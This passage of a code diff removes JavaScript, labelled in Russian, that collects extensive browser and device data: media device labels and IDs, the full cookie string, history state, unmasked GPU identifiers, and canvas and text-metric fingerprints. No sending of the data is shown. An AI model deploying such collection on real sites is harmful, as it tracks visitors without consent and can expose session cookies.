-  PHONE_DATA['077 IdleDetection']   = 'IdleDetector' in window;
-
-  try {
-    if (n.mediaDevices && n.mediaDevices.enumerateDevices) {
-      const d = await n.mediaDevices.enumerateDevices();
-      PHONE_DATA['080 Устройств всего'] = d.length;
-      PHONE_DATA['081 Микрофонов']      = d.filter(x => x.kind === 'audioinput').length;
-      PHONE_DATA['082 Камер']           = d.filter(x => x.kind === 'videoinput').length;
-      PHONE_DATA['083 Динамиков']       = d.filter(x => x.kind === 'audiooutput').length;
-      PHONE_DATA['084 Устройств с метками'] = d.filter(x => x.label).length;
-      d.slice(0, 15).forEach((dev, i) => {
-        const base = 90 + i * 3;
-        PHONE_DATA[String(base).padStart(3,'0') + ' Media ' + i + ' kind']  = dev.kind;
-        PHONE_DATA[String(base+1).padStart(3,'0') + ' Media ' + i + ' label'] = dev.label || '(без метки)';
-        PHONE_DATA[String(base+2).padStart(3,'0') + ' Media ' + i + ' id']    = (dev.deviceId || '').slice(0, 40);
-      });
-    }
-  } catch (e) {}
-  PHONE_DATA['160 getUserMedia']       = !!(n.mediaDevices && n.mediaDevices.getUserMedia);
-  PHONE_DATA['161 GetDisplayMedia']    = !!(n.mediaDevices && n.mediaDevices.getDisplayMedia);
-  PHONE_DATA['162 Media capabilities'] = !!(n.mediaDevices && n.mediaDevices.getSupportedConstraints);
-  PHONE_DATA['163 SpeechSynth']        = 'speechSynthesis' in window;
-  PHONE_DATA['164 SpeechRecog']        = 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window;
-  PHONE_DATA['165 Share API']          = 'share' in n;
-  PHONE_DATA['166 Can share?']         = n.canShare && navigator.canShare({ files: [new File([], 'a.txt', { type: 'text/plain' })] }) || false;
-  PHONE_DATA['167 Wake Lock']          = 'wakeLock' in n;
-  PHONE_DATA['168 Fullscreen']         = 'fullscreenEnabled' in document;
-  PHONE_DATA['169 Screen Capture']     = !!(n.mediaDevices && n.mediaDevices.getDisplayMedia);
-  PHONE_DATA['170 Gamepad']            = 'getGamepads' in n;
-  PHONE_DATA['171 VR XR']              = 'xr' in n;
-  PHONE_DATA['172 Notification']       = 'Notification' in window;
-  PHONE_DATA['173 Notification perm']  = 'Notification' in window ? Notification.permission : '';
-  PHONE_DATA['174 Мобильный режим']    = /Mobi/i.test(ua);
-  PHONE_DATA['175 Память JS (MB)']     = performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) : '';
-  PHONE_DATA['176 Лимит памяти MB']    = performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) : '';
-  PHONE_DATA['177 Всего памяти MB']    = performance.memory ? Math.round(performance.memory.totalJSHeapSize / 1048576) : '';
-  PHONE_DATA['178 Есть GPU']           = 'WebGLRenderingContext' in window;
-  PHONE_DATA['179 WebGL2']             = 'WebGL2RenderingContext' in window;
-  PHONE_DATA['180 WebGPU']             = 'gpu' in n;
-
-  try {
-    if (n.storage && n.storage.estimate) {
-      const e = await n.storage.estimate();
-      PHONE_DATA['190 Квота (MB)']      = Math.round(e.quota / 1048576);
-      PHONE_DATA['191 Использовано KB'] = Math.round(e.usage / 1024);
-    }
-  } catch (e) {}
-
-  PHONE_DATA['200 IndexedDB']       = 'indexedDB' in window;
-  PHONE_DATA['201 localStorage']    = (() => { try { localStorage.setItem('_','1'); localStorage.removeItem('_'); return true; } catch { return false; } })();
-  PHONE_DATA['202 sessionStorage']  = 'sessionStorage' in window;
-  PHONE_DATA['203 Cache API']       = 'caches' in window;
-  PHONE_DATA['204 CookieStore']     = 'cookieStore' in window;
-  PHONE_DATA['205 Web SQL']         = 'openDatabase' in window;
-  PHONE_DATA['206 AppCache']        = 'applicationCache' in window;
-
-  const d = new Date();
-  PHONE_DATA['210 Локальное время'] = d.toLocaleString('ru-RU');
-  PHONE_DATA['211 ISO время']       = d.toISOString();
-  PHONE_DATA['212 Timestamp']       = d.getTime();
-  PHONE_DATA['213 TZ']              = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  PHONE_DATA['214 Смещение TZ']     = d.getTimezoneOffset();
-  PHONE_DATA['215 Локаль']          = Intl.DateTimeFormat().resolvedOptions().locale;
-  PHONE_DATA['216 Календарь']       = Intl.DateTimeFormat().resolvedOptions().calendar;
-  PHONE_DATA['217 Формат чисел']    = Intl.DateTimeFormat().resolvedOptions().numberingSystem;
-  PHONE_DATA['218 Формат времени']  = Intl.DateTimeFormat().resolvedOptions().hourCycle;
-  PHONE_DATA['219 Первый день недели'] = Intl.DateTimeFormat().resolvedOptions().weekInfo ? Intl.DateTimeFormat().resolvedOptions().weekInfo.firstDay : '';
-  PHONE_DATA['220 Uptime стр.']     = Math.round(performance.now());
-  PHONE_DATA['221 Тип сессии']      = performance.navigation ? performance.navigation.type : '';
-  PHONE_DATA['222 Кол-во redirect'] = performance.navigation ? performance.navigation.redirectCount : '';
-  PHONE_DATA['223 Ширина mm']       = (s.width * 25.4 / 96).toFixed(1);
-  PHONE_DATA['224 Высота mm']       = (s.height * 25.4 / 96).toFixed(1);
-  PHONE_DATA['225 Диагональ см']    = (Math.sqrt(s.width**2 + s.height**2) * 25.4 / 96 / 10).toFixed(2);
-  PHONE_DATA['226 RTT из perf']     = performance.timing ? (performance.timing.responseStart - performance.timing.requestStart) : '';
-  PHONE_DATA['227 Тип подключения'] = n.onLine ? 'online' : 'offline';
-  PHONE_DATA['228 Тёмная тема']     = matchMedia('(prefers-color-scheme: dark)').matches;
-  PHONE_DATA['229 Светлая тема']    = matchMedia('(prefers-color-scheme: light)').matches;
-  PHONE_DATA['230 Уменьш. анимац.'] = matchMedia('(prefers-reduced-motion: reduce)').matches;
-  PHONE_DATA['231 Контраст больше'] = matchMedia('(prefers-contrast: more)').matches;
-  PHONE_DATA['232 Контраст меньше'] = matchMedia('(prefers-contrast: less)').matches;
-  PHONE_DATA['233 Hover']           = matchMedia('(hover: hover)').matches;
-  PHONE_DATA['234 Any hover']       = matchMedia('(any-hover: hover)').matches;
-  PHONE_DATA['235 Указатель точный']= matchMedia('(pointer: fine)').matches;
-  PHONE_DATA['236 Указатель грубый']= matchMedia('(pointer: coarse)').matches;
-  PHONE_DATA['237 Any-pointer']     = matchMedia('(any-pointer: coarse)').matches;
-  PHONE_DATA['238 Ориентация media']= matchMedia('(orientation: portrait)').matches ? 'portrait' : 'landscape';
-  PHONE_DATA['239 Цветовая гамма']  = matchMedia('(color-gamut: p3)').matches ? 'p3' : matchMedia('(color-gamut: srgb)').matches ? 'srgb' : '';
-  PHONE_DATA['240 Rec2020']         = matchMedia('(color-gamut: rec2020)').matches;
-  PHONE_DATA['241 HDR']             = matchMedia('(dynamic-range: high)').matches;
-  PHONE_DATA['242 Тип указателя']   = matchMedia('(pointer: coarse)').matches ? 'грубый (тач)' : 'точный (мышь)';
-  PHONE_DATA['243 Скроллбар']       = window.innerWidth - document.documentElement.clientWidth;
-  PHONE_DATA['244 Аппаратное ускорение'] = 'WebGLRenderingContext' in window;
-  PHONE_DATA['245 Forced colors']   = matchMedia('(forced-colors: active)').matches;
-  PHONE_DATA['246 Inverted colors'] = matchMedia('(inverted-colors: inverted)').matches;
-  PHONE_DATA['247 Reduce transparency'] = matchMedia('(prefers-reduced-transparency: reduce)').matches;
-  PHONE_DATA['248 Reduce data']     = matchMedia('(prefers-reduced-data: reduce)').matches;
-  PHONE_DATA['249 Standalone']      = matchMedia('(display-mode: standalone)').matches;
-  PHONE_DATA['250 Fullscreen mode'] = matchMedia('(display-mode: fullscreen)').matches;
-  PHONE_DATA['251 Minimal UI']      = matchMedia('(display-mode: minimal-ui)').matches;
-  PHONE_DATA['252 Browser mode']    = matchMedia('(display-mode: browser)').matches;
-  PHONE_DATA['253 Window controls overlay'] = matchMedia('(display-mode: window-controls-overlay)').matches;
-  PHONE_DATA['254 Picture-in-picture']  = matchMedia('(display-mode: picture-in-picture)').matches;
-  PHONE_DATA['255 Update rate']     = matchMedia('(update: fast)').matches ? 'fast' : matchMedia('(update: slow)').matches ? 'slow' : '';
-  PHONE_DATA['256 Overflow-block']  = matchMedia('(overflow-block: scroll)').matches ? 'scroll' : '';
-  PHONE_DATA['257 Overflow-inline'] = matchMedia('(overflow-inline: scroll)').matches ? 'scroll' : '';
-  PHONE_DATA['258 Monochrome']      = matchMedia('(monochrome)').matches;
-  PHONE_DATA['259 Grid']            = matchMedia('(grid: 0)').matches ? 'bitmap' : 'grid';
-  PHONE_DATA['260 Vendor media']    = '';
-  PHONE_DATA['261 Client Hint DP']  = n.userAgentData ? n.userAgentData.mobile : '';
-  PHONE_DATA['262 Client Hint brands'] = n.userAgentData ? JSON.stringify(n.userAgentData.brands) : '';
-}
-
-// ═══════════════════════════════════════════════════════════
-// БРАУЗЕР — расширенный
-// ═══════════════════════════════════════════════════════════
-function collectBrowser() {
-  const n = navigator;
-  BROWSER_DATA['001 User-Agent']    = n.userAgent;
-  BROWSER_DATA['002 App name']      = n.appName;
-  BROWSER_DATA['003 App version']   = n.appVersion;
-  BROWSER_DATA['004 App code name'] = n.appCodeName;
-  BROWSER_DATA['005 Product']       = n.product;
-  BROWSER_DATA['006 Product sub']   = n.productSub;
-  BROWSER_DATA['007 Vendor']        = n.vendor;
-  BROWSER_DATA['008 Vendor sub']    = n.vendorSub || '';
-  BROWSER_DATA['009 Build ID']      = n.buildID || '';
-  BROWSER_DATA['010 Platform']      = n.platform;
-  BROWSER_DATA['011 Язык']          = n.language;
-  BROWSER_DATA['012 Языки']         = (n.languages || []).join(', ');
-  BROWSER_DATA['013 Cookie enabled']= n.cookieEnabled;
-  BROWSER_DATA['014 Do Not Track']  = n.doNotTrack;
-  BROWSER_DATA['015 Global Privacy']= n.globalPrivacyControl;
-  BROWSER_DATA['016 Online']        = n.onLine;
-  BROWSER_DATA['017 Java enabled']  = typeof n.javaEnabled === 'function' ? n.javaEnabled() : '';
-  BROWSER_DATA['018 PDF viewer']    = n.pdfViewerEnabled;
-  BROWSER_DATA['019 Webdriver']     = n.webdriver;
-  BROWSER_DATA['020 Max touch']     = n.maxTouchPoints;
-  BROWSER_DATA['021 Oscpu']         = n.oscpu || '';
-
-  const ua = n.userAgent;
-  let browser = 'неизвестно', ver = '';
-  const tests = [
-    [/Edg\/([\d.]+)/,           'Edge'],
-    [/OPR\/([\d.]+)/,           'Opera'],
-    [/YaBrowser\/([\d.]+)/,     'Yandex'],
-    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
-    [/Firefox\/([\d.]+)/,       'Firefox'],
-    [/Chrome\/([\d.]+)/,        'Chrome'],
-    [/Version\/([\d.]+).*Safari/, 'Safari'],
-  ];
-  for (const [re, name] of tests) {
-    const m = re.exec(ua);
-    if (m) { browser = name; ver = m[1]; break; }
-  }
-  BROWSER_DATA['022 Браузер']         = browser;
-  BROWSER_DATA['023 Версия браузера'] = ver;
-  BROWSER_DATA['024 Движок']          = /Gecko\/|Firefox/.test(ua) ? 'Gecko' : /AppleWebKit/.test(ua) ? 'WebKit/Blink' : 'неизвестно';
-  BROWSER_DATA['025 Chrome версия']   = (() => { const m = /Chrome\/([\d.]+)/.exec(ua); return m ? m[1] : ''; })();
-  BROWSER_DATA['026 Safari версия']   = (() => { const m = /Version\/([\d.]+).*Safari/.exec(ua); return m ? m[1] : ''; })();
-  BROWSER_DATA['027 Firefox версия']  = (() => { const m = /Firefox\/([\d.]+)/.exec(ua); return m ? m[1] : ''; })();
-  BROWSER_DATA['028 Edge версия']     = (() => { const m = /Edg\/([\d.]+)/.exec(ua); return m ? m[1] : ''; })();
-  BROWSER_DATA['029 Opera версия']    = (() => { const m = /OPR\/([\d.]+)/.exec(ua); return m ? m[1] : ''; })();
-
-  // API поддержка
-  const APIs = {
-    'WebSocket': 'WebSocket' in window,
-    'WebAssembly': 'WebAssembly' in window,
-    'ServiceWorker': 'serviceWorker' in n,
-    'SharedWorker': 'SharedWorker' in window,
-    'Worker': 'Worker' in window,
-    'Fetch': 'fetch' in window,
-    'XMLHttpRequest': 'XMLHttpRequest' in window,
-    'AbortController': 'AbortController' in window,
-    'BroadcastChannel': 'BroadcastChannel' in window,
-    'MessageChannel': 'MessageChannel' in window,
-    'RequestIdleCallback': 'requestIdleCallback' in window,
-    'Scheduler': 'scheduler' in window,
-    'ResizeObserver': 'ResizeObserver' in window,
-    'IntersectionObserver': 'IntersectionObserver' in window,
-    'MutationObserver': 'MutationObserver' in window,
-    'PerformanceObserver': 'PerformanceObserver' in window,
-    'ReportingObserver': 'ReportingObserver' in window,
-    'Credentials': 'credentials' in n,
-    'PaymentRequest': 'PaymentRequest' in window,
-    'WebAuthn': 'PublicKeyCredential' in window,
-    'Clipboard': 'clipboard' in n,
-    'EyeDropper': 'EyeDropper' in window,
-    'LaunchQueue': 'launchQueue' in window,
-    'DocumentPiP': 'documentPictureInPicture' in window,
-    'IdleDetection': 'IdleDetector' in window,
-    'WebTransport': 'WebTransport' in window,
-    'WebCodecs VideoEncoder': 'VideoEncoder' in window,
-    'WebCodecs VideoDecoder': 'VideoDecoder' in window,
-    'WebCodecs AudioEncoder': 'AudioEncoder' in window,
-    'WebCodecs AudioDecoder': 'AudioDecoder' in window,
-    'Push API': 'PushManager' in window,
-    'Notifications': 'Notification' in window,
-    'File System Access': 'showOpenFilePicker' in window,
-    'File System Save': 'showSaveFilePicker' in window,
-    'File System Dir': 'showDirectoryPicker' in window,
-    'File API': 'FileReader' in window,
-    'DragDrop': 'ondrag' in window,
-    'PointerLock': 'pointerLockElement' in document,
-    'Fullscreen': 'fullscreenEnabled' in document,
-    'SpeechSynthesis': 'speechSynthesis' in window,
-    'SpeechRecognition': ('SpeechRecognition' in window) || ('webkitSpeechRecognition' in window),
-    'OfflineAudio': 'OfflineAudioContext' in window,
-    'AudioContext': 'AudioContext' in window,
-    'MediaSession': 'mediaSession' in n,
-    'PictureInPicture': 'pictureInPictureEnabled' in document,
-    'CookieStore': 'cookieStore' in window,
-    'Geolocation': 'geolocation' in n,
-    'Vibration': 'vibrate' in n,
-    'Battery': 'getBattery' in n,
-    'Bluetooth': 'bluetooth' in n,
-    'USB': 'usb' in n,
-    'Serial': 'serial' in n,
-    'HID': 'hid' in n,
-    'NFC': 'NDEFReader' in window,
-    'MIDI': 'requestMIDIAccess' in n,
-    'WebVR': 'VRDisplay' in window,
-    'WebXR': 'xr' in n,
-    'Gamepad': 'getGamepads' in n,
-    'Wake Lock': 'wakeLock' in n,
-    'Screen Orientation': 'orientation' in screen,
-    'Network Info': 'connection' in n || 'mozConnection' in n || 'webkitConnection' in n,
-    'Permissions': 'permissions' in n,
-    'Storage Manager': 'storage' in n,
-    'Contacts': 'contacts' in n,
-    'Credentials Container': 'credentials' in n,
-    'Sanitizer': 'Sanitizer' in window,
-    'Trusted Types': 'trustedTypes' in window,
-    'Scheduler PostTask': 'scheduler' in window && 'postTask' in window.scheduler,
-    'Compression Stream': 'CompressionStream' in window,
-    'Decompression Stream': 'DecompressionStream' in window,
-    'Text Encoder': 'TextEncoder' in window,
-    'Text Decoder': 'TextDecoder' in window,
-    'Text Encoder Stream': 'TextEncoderStream' in window,
-    'Text Decoder Stream': 'TextDecoderStream' in window,
-    'URL Pattern': 'URLPattern' in window,
-    'URLSearchParams': 'URLSearchParams' in window,
-    'URL.canParse': 'URL' in window && 'canParse' in URL,
-    'AbortSignal.timeout': 'AbortSignal' in window && 'timeout' in AbortSignal,
-    'AbortSignal.any': 'AbortSignal' in window && 'any' in AbortSignal,
-    'structuredClone': 'structuredClone' in window,
-    'atob/btoa': ('atob' in window) && ('btoa' in window),
-    'queueMicrotask': 'queueMicrotask' in window,
-    'IntersectionObserver v2': 'IntersectionObserver' in window && 'v2' in IntersectionObserver,
-    'Performance.mark': 'performance' in window && 'mark' in performance,
-    'Performance.measure': 'performance' in window && 'measure' in performance,
-    'Performance.now': 'performance' in window && 'now' in performance,
-    'PerformanceMemory': performance && 'memory' in performance,
-    'Reporting API': 'ReportBody' in window,
-    'CSS Paint': 'PaintWorklet' in window,
-    'CSS.registerProperty': 'CSS' in window && 'registerProperty' in CSS,
-    'CSS.supports': 'CSS' in window && 'supports' in CSS,
-    'CSS Typed OM': 'CSSUnitValue' in window,
-    'CSS Font Loading': 'FontFace' in window,
-    'CSS Houdini Layout': 'LayoutWorklet' in window,
-    'ImageDecoder': 'ImageDecoder' in window,
-    'ImageCapture': 'ImageCapture' in window,
-    'MediaCapabilities': 'MediaCapabilities' in window && 'mediaCapabilities' in n,
-    'MediaRecorder': 'MediaRecorder' in window,
-    'MediaSource': 'MediaSource' in window,
-    'ManagedMediaSource': 'ManagedMediaSource' in window,
-    'SourceBuffer': 'SourceBuffer' in window,
-    'Encrypted Media': 'requestMediaKeySystemAccess' in n,
-    'WebAudio': 'AudioContext' in window,
-    'WebMIDI': 'requestMIDIAccess' in n,
-    'WebRTC': 'RTCPeerConnection' in window,
-    'RTCDataChannel': 'RTCDataChannel' in window,
-    'RTCIceGatherer': 'RTCIceGatherer' in window,
-    'WebTransport': 'WebTransport' in window,
-    'WebCodecs AudioData': 'AudioData' in window,
-    'WebCodecs VideoFrame': 'VideoFrame' in window,
-    'WebCodecs ImageDecoder': 'ImageDecoder' in window,
-    'Reporting Observer': 'ReportingObserver' in window,
-    'Sanitizer API': 'Sanitizer' in window,
-    'Selection API': 'getSelection' in window,
-    'Clipboard Item': 'ClipboardItem' in window,
-    'Clipboard Read': 'clipboard' in n && 'read' in n.clipboard,
-    'Clipboard Write': 'clipboard' in n && 'write' in n.clipboard,
-    'EyeDropper API': 'EyeDropper' in window,
-    'File System Observer': 'FileSystemObserver' in window,
-    'Launch Handler': 'launchQueue' in window,
-    'Document PiP': 'documentPictureInPicture' in window,
-    'View Transitions': 'ViewTransition' in window || ('startViewTransition' in document),
-    'Popover API': 'popover' in HTMLElement.prototype,
-    'Dialog Element': 'HTMLDialogElement' in window,
-    'Details Element': 'HTMLDetailsElement' in window,
-    'Template Element': 'HTMLTemplateElement' in window,
-    'Slot Element': 'HTMLSlotElement' in window,
-    'Custom Elements': 'customElements' in window,
-    'Shadow DOM': 'attachShadow' in Element.prototype,
-    'Declarative Shadow DOM': 'shadowRootMode' in HTMLTemplateElement.prototype,
-    'Web Components': ('customElements' in window) && ('attachShadow' in Element.prototype),
-    'ES Modules': 'noModule' in HTMLScriptElement.prototype === false,
-    'Import Maps': 'import' in HTMLScriptElement.prototype,
-    'CSS Grid': CSS && CSS.supports && CSS.supports('display', 'grid'),
-    'CSS Flex': CSS && CSS.supports && CSS.supports('display', 'flex'),
-    'CSS Variables': CSS && CSS.supports && CSS.supports('--a', '0'),
-    'CSS Aspect Ratio': CSS && CSS.supports && CSS.supports('aspect-ratio', '1/1'),
-    'CSS Container Queries': CSS && CSS.supports && CSS.supports('container-type', 'inline-size'),
-    'CSS Gap in Flex': CSS && CSS.supports && CSS.supports('gap', '1px'),
-    'CSS Subgrid': CSS && CSS.supports && CSS.supports('grid-template-columns', 'subgrid'),
-    'CSS Nesting': CSS && CSS.supports && CSS.supports('selector(&)', 'a'),
-    'CSS Color Level 4': CSS && CSS.supports && CSS.supports('color', 'oklch(0.5 0.5 0.5)'),
-    'CSS Color Level 5': CSS && CSS.supports && CSS.supports('color-mix', 'in srgb, red, blue'),
-    'CSS :has()': CSS && CSS.supports && CSS.supports('selector(:has(*))', 'a'),
-    'CSS @layer': CSS && CSS.supports && CSS.supports('at-rule(@layer)', ''),
-    'CSS @scope': CSS && CSS.supports && CSS.supports('at-rule(@scope)', ''),
-    'CSS Anchor Positioning': CSS && CSS.supports && CSS.supports('anchor-name', '--a'),
-    'CSS Scroll Timeline': CSS && CSS.supports && CSS.supports('scroll-timeline', '--a'),
-    'CSS View Timeline': CSS && CSS.supports && CSS.supports('view-timeline', '--a'),
-    'CSS Relative Colors': CSS && CSS.supports && CSS.supports('color', 'rgb(from red r g b)'),
-  };
-  let i = 100;
-  for (const k in APIs) {
-    BROWSER_DATA[String(i++).padStart(3,'0') + ' API ' + k] = APIs[k];
-  }
-
-  BROWSER_DATA['300 Referrer']        = document.referrer;
-  BROWSER_DATA['301 URL']             = location.href;
-  BROWSER_DATA['302 Origin']          = location.origin;
-  BROWSER_DATA['303 Protocol']        = location.protocol;
-  BROWSER_DATA['304 Hostname']        = location.hostname;
-  BROWSER_DATA['305 Path']            = location.pathname;
-  BROWSER_DATA['306 Port']            = location.port || 'по умолчанию';
-  BROWSER_DATA['307 History length']  = history.length;
-  BROWSER_DATA['308 History state']   = history.state ? JSON.stringify(history.state).slice(0, 200) : '';
-  BROWSER_DATA['309 Кодировка']       = document.characterSet;
-  BROWSER_DATA['310 Content-Type']    = document.contentType;
-  BROWSER_DATA['311 Ready state']     = document.readyState;
-  BROWSER_DATA['312 Title документа'] = document.title;
-  BROWSER_DATA['313 Visibility']      = document.visibilityState;
-  BROWSER_DATA['314 Скрыт']           = document.hidden;
-  BROWSER_DATA['315 Кол-во cookie']   = document.cookie ? document.cookie.split(';').length : 0;
-  BROWSER_DATA['316 Cookie строка']   = document.cookie || '(пусто)';
-  BROWSER_DATA['317 Compat mode']     = document.compatMode;
-  BROWSER_DATA['318 Design mode']     = document.designMode;
-  BROWSER_DATA['319 Referrer policy'] = document.referrerPolicy;
-  BROWSER_DATA['320 Last modified']   = document.lastModified;
-  BROWSER_DATA['321 Domain']          = document.domain;
-  BROWSER_DATA['322 Base URI']        = document.baseURI;
-  BROWSER_DATA['323 URL doc']         = document.URL;
-  BROWSER_DATA['324 Location href']   = document.location.href;
-  BROWSER_DATA['325 Хост']            = location.hostname;
-  BROWSER_DATA['326 Язык документа']  = document.documentElement.lang || '';
-  BROWSER_DATA['327 Dir']             = document.documentElement.dir || '';
-  BROWSER_DATA['328 Class name']      = document.documentElement.className;
-  BROWSER_DATA['329 Дочерних узлов']  = document.documentElement.childNodes.length;
-  BROWSER_DATA['330 Количество тегов']= document.getElementsByTagName('*').length;
-  BROWSER_DATA['331 Количество форм'] = document.forms.length;
-  BROWSER_DATA['332 Количество изображений'] = document.images.length;
-  BROWSER_DATA['333 Количество ссылок']      = document.links.length;
-  BROWSER_DATA['334 Количество скриптов']    = document.scripts.length;
-  BROWSER_DATA['335 Количество стилей']      = document.styleSheets.length;
-  BROWSER_DATA['336 Есть DOCTYPE']     = !!document.doctype;
-  BROWSER_DATA['337 DOCTYPE name']     = document.doctype ? document.doctype.name : '';
-  BROWSER_DATA['338 Active element']   = document.activeElement ? document.activeElement.tagName : '';
-  BROWSER_DATA['339 Has focus']        = document.hasFocus();
-  BROWSER_DATA['340 Scroll X']         = window.scrollX;
-  BROWSER_DATA['341 Scroll Y']         = window.scrollY;
-  BROWSER_DATA['342 Page X offset']    = window.pageXOffset;
-  BROWSER_DATA['343 Page Y offset']    = window.pageYOffset;
-  BROWSER_DATA['344 Window name']      = window.name || '(пусто)';
-  BROWSER_DATA['345 Window closed']    = window.closed;
-  BROWSER_DATA['346 Frame count']      = window.frames.length;
-  BROWSER_DATA['347 Top === self']     = window.top === window.self;
-  BROWSER_DATA['348 Parent === self']  = window.parent === window.self;
-  BROWSER_DATA['349 Opener']           = window.opener ? 'есть' : 'нет';
-  BROWSER_DATA['350 Navigator.plugins'] = navigator.plugins.length;
-}
-
-// ═══════════════════════════════════════════════════════════
-// ДРУГОЕ — WebGL / Canvas / Audio / Шрифты / Кодеки
-// ═══════════════════════════════════════════════════════════
-function collectWebGL() {
-  try {
-    const c = document.createElement('canvas');
-    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-    if (!gl) { OTHER_DATA['001 WebGL доступен'] = false; return; }
-    OTHER_DATA['001 WebGL доступен'] = true;
-    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    if (dbg) {
-      OTHER_DATA['002 GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-      OTHER_DATA['003 GPU рендер'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-    }
-    OTHER_DATA['004 WebGL версия']  = gl.getParameter(gl.VERSION);
-    OTHER_DATA['005 GLSL версия']   = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-    OTHER_DATA['006 Макс текстура'] = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-    OTHER_DATA['007 Макс viewport'] = (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join('x');
-    OTHER_DATA['008 Макс атрибуты'] = gl.getParameter(gl.MAX_VERTEX_ATTRIBS);
-    OTHER_DATA['009 Макс uniform']  = gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS);
-    OTHER_DATA['010 Макс varying']  = gl.getParameter(gl.MAX_VARYING_VECTORS);
-    OTHER_DATA['011 Макс fragment'] = gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS);
-    OTHER_DATA['012 Макс comb texture'] = gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS);
-    OTHER_DATA['013 Макс vertex texture'] = gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS);
-    OTHER_DATA['014 Макс texture units'] = gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS);
-    OTHER_DATA['015 Макс cube size'] = gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE);
-    OTHER_DATA['016 Макс renderbuffer'] = gl.getParameter(gl.MAX_RENDERBUFFER_SIZE);
-    OTHER_DATA['017 Макс samples']   = gl.getParameter(gl.MAX_SAMPLES);
-    OTHER_DATA['018 Макс viewport dims'] = (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join(' x ');
-    OTHER_DATA['019 Alias line width'] = (gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE) || []).join('-');
-    OTHER_DATA['020 Alias point size'] = (gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) || []).join('-');
-    const exts = gl.getSupportedExtensions() || [];
-    OTHER_DATA['021 WebGL расширений'] = exts.length;
-    exts.forEach((e, i) => {
-      OTHER_DATA[String(100 + i).padStart(3,'0') + ' WebGL ext'] = e;
-    });
-    const params = gl.getParameter(gl);
-  } catch (e) {}
-
-  try {
-    const c2 = document.createElement('canvas');
-    const gl2 = c2.getContext('webgl2');
-    if (gl2) {
-      OTHER_DATA['200 WebGL2 доступен'] = true;
-      OTHER_DATA['201 WebGL2 версия']   = gl2.getParameter(gl2.VERSION);
-      OTHER_DATA['202 WebGL2 GLSL']     = gl2.getParameter(gl2.SHADING_LANGUAGE_VERSION);
-      const dbg2 = gl2.getExtension('WEBGL_debug_renderer_info');
-      if (dbg2) {
-        OTHER_DATA['203 WebGL2 GPU вендор'] = gl2.getParameter(dbg2.UNMASKED_VENDOR_WEBGL);
-        OTHER_DATA['204 WebGL2 GPU рендер'] = gl2.getParameter(dbg2.UNMASKED_RENDERER_WEBGL);
-      }
-      const exts2 = gl2.getSupportedExtensions() || [];
-      OTHER_DATA['205 WebGL2 ext count'] = exts2.length;
-      exts2.slice(0, 40).forEach((e, i) => {
-        OTHER_DATA[String(210 + i).padStart(3,'0') + ' WebGL2 ext'] = e;
-      });
-    }
-  } catch (e) {}
-
-  try {
-    const c3 = document.createElement('canvas');
-    const gl3 = c3.getContext('webgl');
-    if (gl3) {
-      const dbg3 = gl3.getExtension('WEBGL_debug_renderer_info');
-      // WebGL минимальные требования
-      OTHER_DATA['280 Красный bits']   = gl3.getParameter(gl3.RED_BITS);
-      OTHER_DATA['281 Зелёный bits']   = gl3.getParameter(gl3.GREEN_BITS);
-      OTHER_DATA['282 Синий bits']     = gl3.getParameter(gl3.BLUE_BITS);
-      OTHER_DATA['283 Альфа bits']     = gl3.getParameter(gl3.ALPHA_BITS);
-      OTHER_DATA['284 Depth bits']     = gl3.getParameter(gl3.DEPTH_BITS);
-      OTHER_DATA['285 Stencil bits']   = gl3.getParameter(gl3.STENCIL_BITS);
-      OTHER_DATA['286 Subpixel bits']  = gl3.getParameter(gl3.SUBPIXEL_BITS);
-      OTHER_DATA['287 Samples']        = gl3.getParameter(gl3.SAMPLES);
-    }
-  } catch (e) {}
-}
-
-function collectCanvas() {
-  try {
-    const c = document.createElement('canvas');
-    c.width = 280; c.height = 60;
-    const ctx = c.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '16px Arial';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(0, 0, 100, 30);
-    ctx.fillStyle = '#069';
-    ctx.fillText('Fingerprint 你好', 2, 10);
-    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-    ctx.fillText('Fingerprint 你好', 4, 20);
-    const d = c.toDataURL();
-    OTHER_DATA['300 Canvas hash']  = simpleHash(d);
-    OTHER_DATA['301 Canvas длина'] = d.length;
-    OTHER_DATA['302 Canvas prefix'] = d.slice(0, 30);
-
-    // Цветовая проверка
-    const c2 = document.createElement('canvas');
-    c2.width = 1; c2.height = 1;
-    const ctx2 = c2.getContext('2d');
-    ctx2.fillStyle = '#f00';
-    ctx2.fillRect(0, 0, 1, 1);
-    const px = ctx2.getImageData(0, 0, 1, 1).data;
-    OTHER_DATA['303 Red pixel'] = Array.from(px).join(',');
-
-    // Проверка WebGL Canvas
-    try {
-      const c3 = document.createElement('canvas');
-      const gl = c3.getContext('webgl');
-      if (gl) {
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        const ext = gl.getSupportedExtensions();
-        OTHER_DATA['304 WebGL vendor short'] = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'нет';
-      }
-    } catch (e) {}
-  } catch (e) {}
-
-  // TextMetrics fingerprint
-  try {
-    const c = document.createElement('canvas');
-    const ctx = c.getContext('2d');
-    ctx.font = '14px Arial';
-    const m = ctx.measureText('Fingerprint 你好 🎉');
-    OTHER_DATA['310 TextMetrics width'] = m.width;
